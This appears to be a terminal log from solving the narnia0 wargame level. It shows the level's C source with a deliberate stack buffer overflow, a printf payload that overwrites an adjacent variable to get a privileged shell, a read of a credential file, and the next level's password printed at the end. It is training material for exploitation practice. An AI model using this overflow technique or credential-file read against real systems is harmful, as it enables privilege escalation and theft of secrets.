@@ -1,0 +1,84 @@
+//solving narnia0
+
+
+
+narnia0@narnia:~$ ls
+narnia0@narnia:~$ ls -la
+total 20
+drwxr-xr-x   2 root root 4096 Jun 24 15:01 .
+drwxr-xr-x 150 root root 4096 Jun 24 15:02 ..
+-rw-r--r--   1 root root  220 Feb 13  2026 .bash_logout
+-rw-r--r--   1 root root 3851 Jun 24 14:50 .bashrc
+-rw-r--r--   1 root root  807 Feb 13  2026 .profile
+narnia0@narnia:~$ cd narnia0
+-bash: cd: narnia0: No such file or directory
+narnia0@narnia:~$ cd /narnia/
+narnia0@narnia:/narnia$ la 
+narnia0    narnia1.c  narnia3    narnia4.c  narnia6    narnia7.c
+narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8
+narnia1    narnia2.c  narnia4    narnia5.c  narnia7    narnia8.c
+narnia0@narnia:/narnia$ ./narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: AAAAAAAAAAAAAAAAAAAA
+buf: AAAAAAAAAAAAAAAAAAAA
+val: 0x41414100
+WAY OFF!!!!
+narnia0@narnia:/narnia$ cat narnia0.c 
+/*
+   This program is free software; you can redistribute it and/or modify
+   it under the terms of the GNU General Public License as published by
+   the Free Software Foundation; either version 2 of the License, or
+   (at your option) any later version.
+
+   This program is distributed in the hope that it will be useful,
+   but WITHOUT ANY WARRANTY; without even the implied warranty of
+   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+   GNU General Public License for more details.
+
+   You should have received a copy of the GNU General Public License
+   along with this program; if not, write to the Free Software
+   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
+   */
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(){
+    long val=0x41414141;
+    char buf[20];
+
+    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
+    printf("Here is your chance: ");
+    scanf("%24s",&buf);
+
+    printf("buf: %s\n",buf);
+    printf("val: 0x%08x\n",val);
+
+    if(val==0xdeadbeef){
+        setreuid(geteuid(),geteuid());
+        system("/bin/sh");
+    }
+    else {
+        printf("WAY OFF!!!!\n");
+        exit(1);
+    }
+
+    return 0;
+}
+narnia0@narnia:/narnia$ (printf 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde'; cat) | ./narnia0 
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
+val: 0xdeadbeef
+whoami
+narnia1
+cat /etc/narnia_pass/narnia1
+^C
+narnia0@narnia:/narnia$ (printf 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde'; cat) | ./narnia0 
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
+val: 0xdeadbeef
+whoami
+cat /etc/narnia_pass/narnia1
+cd /etc
+narnia1
+O8dJypubLr
